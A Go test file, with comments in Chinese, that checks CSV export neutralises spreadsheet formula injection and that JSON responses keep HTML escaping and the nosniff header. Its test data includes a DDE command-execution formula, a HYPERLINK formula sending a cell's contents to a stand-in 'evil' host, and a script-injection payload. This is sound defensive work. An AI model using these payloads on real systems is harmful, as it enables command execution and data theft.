package console

import (
	"encoding/json"
	"net/http/httptest"
	"strings"
	"testing"
)

// 的回归：CSV 导出必须中和公式注入。
//
// Excel / Google Sheets 会把 `=`、`+`、`-`、`@`、制表符、回车开头的单元格
// **当公式执行**，而导出列里的路径、UA、明细都是攻击者可控的 ——
// "运维导出日志用 Excel 打开"就成了一条打穿运维机器的路径。
func TestCSVCellNeutralizesFormulas(t *testing.T) {
	bad := []string{
		`=cmd|'/c calc'!A1`,
		`+1+1`,
		`-2+3`,
		`@SUM(A1)`,
		"\t=1+1",
		"\r=1+1",
		`=HYPERLINK("http://evil/?"&A1)`,
	}
	for _, s := range bad {
		got := csvCell(s)
		if got == s {
			t.Errorf("%q 没有被中和（Excel 会把它当公式执行）", s)
		}
		if !strings.HasPrefix(got, "'") {
			t.Errorf("%q 的中和结果应当以单引号开头，实际 %q", s, got)
		}
		// 原值必须完整保留（只是前面多了个引号，日志分析脚本要能还原）
		if strings.TrimPrefix(got, "'") != s {
			t.Errorf("%q 的内容被改坏了：%q", s, got)
		}
	}

	// 正常值不能被误伤
	for _, s := range []string{"", "/api/v1/users", "Mozilla/5.0", "1 union select 2", "192.0.2.1"} {
		if got := csvCell(s); got != s {
			t.Errorf("%q 是正常值，不该被改：%q", s, got)
		}
	}
}

// 的回归：JSON 响应**保持 HTML 转义**。
//
// 原先显式 `SetEscapeHTML(false)`，于是事件里的用户可控字段（路径、UA、payload）
// 会原样带着 `<script>` 出现在响应体里。虽然还有 nosniff 与前端 textContent 两道，
// 但没有理由自己拆一道 —— 转义后的 `\u003c` 在 JS 里解码结果完全一样。
func TestWriteJSONKeepsHTMLEscaping(t *testing.T) {
	w := httptest.NewRecorder()
	writeJSON(w, 200, map[string]any{
		"path": "/x?a=<script>alert(1)</script>",
	})

	raw := w.Body.String()
	if strings.Contains(raw, "<script>") {
		t.Errorf("响应体里出现了未转义的 <script>：%s", raw)
	}
	if !strings.Contains(raw, `\u003c`) {
		t.Errorf("期望看到 HTML 转义后的 \\u003c：%s", raw)
	}
	// 但**解码回来必须一模一样**（转义不影响语义）
	var out map[string]string
	if err := json.Unmarshal([]byte(raw), &out); err != nil {
		t.Fatalf("响应体不是合法 JSON：%v", err)
	}
	if out["path"] != "/x?a=<script>alert(1)</script>" {
		t.Errorf("解码后内容变了：%q", out["path"])
	}
	// nosniff 必须还在
	if got := w.Header().Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("X-Content-Type-Options 应为 nosniff，实际 %q", got)
	}
}
